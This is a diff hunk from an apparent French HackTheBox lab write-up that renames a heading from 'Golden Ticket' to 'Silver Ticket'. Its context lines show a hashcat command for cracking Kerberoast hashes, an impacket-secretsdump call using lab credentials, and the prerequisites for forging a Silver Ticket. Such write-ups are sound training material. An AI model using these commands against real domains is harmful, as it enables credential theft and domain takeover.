@@ -96,7 +96,7 @@ hashcat -m 13100 -a 0 hash_file.txt /usr/share/wordlists/rockyou.txt
 impacket-secretsdump 'administration.htb'/'ethan':'limpbizkit'@'10.129.41.21
 ```
 
-## Golden Ticket
+## Silver Ticket
 Pour créer un Silver ticket il faut : 
 1. NTLM Hash du mot de passe du compte de service
 2. Le SID du domaine
